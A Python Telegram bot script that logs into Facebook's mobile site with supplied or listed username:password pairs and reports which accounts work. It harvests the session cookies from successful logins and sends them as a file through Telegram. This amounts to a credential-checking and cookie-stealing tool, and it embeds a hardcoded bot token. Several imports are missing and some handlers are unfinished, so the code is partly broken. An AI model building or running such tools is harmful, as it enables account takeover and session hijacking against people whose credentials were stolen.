import requests

class FacebookBot:
    def __init__(self, token):
        self.bot = telebot.TeleBot(token)
        self.url = 'https://n.facebook.com'
        self.xurl = self.url + '/login.php'
        self.ua = "Mozilla/5.0 (Linux; Android 4.1.2; GT-I8552 Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36"
        self.login_states = {}
        self.account_list = ['user1:password1', 'user2:password2']  # Add your account credentials here
        self.checking_list = []

        self.bot.message_handler(commands=['start'])(self.start)
        self.bot.callback_query_handler(func=lambda call: call.data == 'login')(self.get_username)
        self.bot.callback_query_handler(func=lambda call: call.data == 'login_from_list')(self.send_account_list)
        self.bot.callback_query_handler(func=lambda call: call.data == 'check_list')(self.check_accounts)
        self.bot.message_handler(func=lambda message: True)(self.get_password)

    def start(self, message):
        chat_id = message.chat.id
        markup = types.InlineKeyboardMarkup()
        login_button = types.InlineKeyboardButton("Login", callback_data='login')
        login_from_list_button = types.InlineKeyboardButton("Login from List", callback_data='login_from_list')
        markup.add(login_button, login_from_list_button)
        self.bot.send_message(chat_id, f"Welcome, {message.from_user.first_name}!", reply_markup=markup)

    def get_username(self, call):
        chat_id = call.message.chat.id
        self.bot.send_message(chat_id, "Send 'username:password':")
        self.bot.register_next_step_handler(call.message, self.get_password)

    def get_password(self, message):
        chat_id = message.chat.id
        user_pass = message.text.strip().split(':')

        if len(user_pass) != 2:
            self.bot.send_message(chat_id, "Invalid format. Please enter your username and password in the format 'username:password'.")
            return

        user, pswd = user_pass
        self.login_states[chat_id] = {'user': user}
        self.perform_login(chat_id, user, pswd)

    def send_account_list(self, call):
        chat_id = call.message.chat.id
        markup = types.InlineKeyboardMarkup()
        for account in self.account_list:
            account_button = types.InlineKeyboardButton(account, callback_data=f'check_account:{account}')
            markup.add(account_button)
        check_list_button = types.InlineKeyboardButton("Check from List", callback_data='check_list')
        markup.add(check_list_button)
        self.bot.send_message(chat_id, "Here is the list of accounts. Press 'Check from List' to start checking.", reply_markup=markup)

    def check_accounts(self, call):
        chat_id = call.message.chat.id
        for account in self.checking_list:
            user, pswd = account.split(':')
            self.perform_login(chat_id, user, pswd)

    def perform_login(self, chat_id, user, pswd):
        try:
            session = requests.Session()
            session.headers.update({
                'User-Agent': self.ua
            })

            with session.get(self.url) as response_body:
                inspect = bs(response_body.text, 'html.parser')
                lsd_key = inspect.find('input', {'name': 'lsd'})['value']
                jazoest_key = inspect.find('input', {'name': 'jazoest'})['value']
                m_ts_key = inspect.find('input', {'name': 'm_ts'})['value']
                li_key = inspect.find('input', {'name': 'li'})['value']
                try_number_key = inspect.find('input', {'name': 'try_number'})['value']
                unrecognized_tries_key = inspect.find('input', {'name': 'unrecognized_tries'})['value']
                bi_xrwh_key = inspect.find('input', {'name': 'bi_xrwh'})['value']

                data = {
                    'lsd': lsd_key, 'jazoest': jazoest_key,
                    'm_ts': m_ts_key, 'li': li_key,
                    'try_number': try_number_key,
                    'unrecognized_tries': unrecognized_tries_key,
                    'bi_xrwh': bi_xrwh_key, 'email': user,
                    'pass': pswd, 'login': "submit"
                }

                response_body2 = session.post(self.xurl, data=data, allow_redirects=True, timeout=300)
                cookie = str(session.cookies.get_dict())[1:-1].replace("'", "").replace(",", ";").replace(":", "=")

                if 'checkpoint' in cookie:
                    self.bot.send_message(chat_id, f"Account {user} terminated by Facebook!")
                elif 'c_user' in cookie:
                    self.bot.send_message(chat_id, f'Successfully logged in as {user}!')
                    self.send_cookies_as_file(chat_id, user, cookie)
                else:
                    self.bot.send_message(chat_id, f"Login failed for {user}. Incorrect details")

        except requests.exceptions.ConnectionError:
            self.bot.send_message(chat_id, 'No internet')
        except Exception as e:
            self.bot.send_message(chat_id, f"An error occurred: {str(e)}")

    def send_cookies_as_file(self, chat_id, username, cookies):
        try:
            file_name = f'{username}_cookies.txt'
            with open(file_name, 'w') as cookie_file:
                cookie_file.write(cookies)

            with open(file_name, 'rb') as cookie_file:
                self.bot.send_document(chat_id, cookie_file)

        except Exception as e:
            self.bot.send_message(chat_id, f"An error occurred while sending cookies: {str(e)}")

    def run(self):
        self.bot.polling()

if __name__ == "__main__":
    bot = FacebookBot('6326681561:AAFN-WTkbre-YaeKnROCqtZEx0fBmXWdykg')
    bot.run()
